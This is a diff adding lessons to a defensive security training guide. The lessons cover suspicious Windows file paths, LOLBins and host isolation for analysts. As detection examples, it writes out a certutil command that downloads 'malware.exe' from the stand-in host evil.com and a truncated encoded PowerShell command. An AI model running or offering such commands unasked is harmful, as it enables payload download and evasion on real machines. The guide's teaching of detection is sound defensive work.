@@ -102,3 +102,127 @@ ____
 
 # 3: Suspicious File Paths
 
+#### Dangerous Locations
+
+Malware commonly uses these directories:
+
+| Location | Path | Why Dangerous |
+|----------|------|---------------|
+| **Temp Folders** | `C:\Windows\Temp\` | Easy write access |
+| | `C:\Users\<user>\AppData\Local\Temp\` | |
+| **AppData** | `C:\Users\<user>\AppData\Local\` | Hidden, persistent |
+| | `C:\Users\<user>\AppData\Roaming\` | |
+| **ProgramData** | `C:\ProgramData\` | System-wide access |
+| **Public Folders** | `C:\Users\Public\` | Everyone has access |
+| **Recycle Bin** | `C:\$Recycle.Bin\` | Hidden from users |
+
+
+#### Suspicious Patterns
+
+| Pattern | Why Suspicious | Example |
+|---------|----------------|---------|
+| EXE in Temp | Legitimate apps don't run from Temp | `C:\Temp\svchost.exe` |
+| EXE in AppData | Persistence location | `C:\Users\john\AppData\Roaming\update.exe` |
+| Misspelled system file | Masquerading | `svch0st.exe`, `csrrs.exe` |
+| System name, wrong path | Fake system file | `C:\Temp\svchost.exe` |
+| Random name | Auto-generated malware | `a3f2x9.exe`, `tmpC4D2.exe` |
+| Hidden file | Evasion technique | `.hidden.exe` |
+
+---
+
+#### Legitimate System Paths
+
+**Real system files location:**
+- C:\Windows\System32\svchost.exe 
+- C:\Windows\System32\cmd.exe 
+- C:\Windows\System32\powershell.exe 
+
+**SUSPICIOUS - SAME NAME, WRONG PATH:**
+- C:\Temp\svchost.exe
+- C:\Users\Public\cmd.exe
+- C:\ProgramData\powershell.exe 
+
+____
+
+
+# 4: LOLBins (Living Off The Land Binaries)
+
+## LOLBins
+
+**Legitimate Windows tools** abused by attackers to avoid detection.
+
+**Why attackers use them:**
+- ✅ Pre-installed on Windows
+- ✅ Signed by Microsoft (trusted)
+- ✅ Often whitelisted
+- ✅ Hard to block (breaks legitimate use)
+
+### Critical LOLBins
+
+#### 1. powershell.exe -enc
+
+```
+PURPOSE: Execute encoded (hidden) commands
+
+MALICIOUS USE:
+powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
+
+WHAT IT DOES:
+- Decodes and runs Base64 command
+- Hides true intent from logs
+
+DETECTION:
+- "-enc" or "-encoded" flag
+- Long Base64 string as argument
+```
+
+#### 2. certutil.exe -urlcache
+```
+PURPOSE: Certificate utility (legitimate)
+
+MALICIOUS USE:
+certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\Temp\mal.exe
+
+WHAT IT DOES:
+- Downloads file from internet
+- Saves to local disk
+
+DETECTION:
+- "-urlcache" flag
+- "-f" (force) flag
+- URL in command line
+```
+
+___
+
+# Lesson 5: Isolate Host Action
+
+## Host Isolation
+Immediately disconnect compromised host from network while maintaining EDR connection.
+```
+BEFORE ISOLATION:
+[Infected Host] ←→ [Network] ←→ [Other Systems]
+                                        ↑
+                               Malware can spread!
+
+AFTER ISOLATION:
+[Infected Host] ←X→ [Network] ←→ [Other Systems]
+       ↓
+[EDR Cloud] ← Still connected for investigation!
+```
+
+
+### When to Isolate:
+```
+✅ ISOLATE IMMEDIATELY:
+- Active ransomware
+- C2 communication detected
+- Credential dumping in progress
+- Lateral movement attempts
+- Active data exfiltration
+
+⚠️ CONSIDER BEFORE ISOLATING:
+- Critical production server (get approval)
+- Domain controller (major impact)
+- Evidence preservation needed
+```
